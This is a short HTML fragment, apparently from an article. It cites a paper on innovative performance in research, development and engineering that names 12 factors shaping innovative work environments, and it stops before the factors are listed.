<li>In <a href="https://doi.org/10.1080/10429247.1990.11414554">“Innovative Performance in Research, Development, and Engineering”</a> the authors identify 12 factors<sup id="fnref-4"><a href="#fn-4">4</a></sup> that strongly influence innovative work environments:</li>
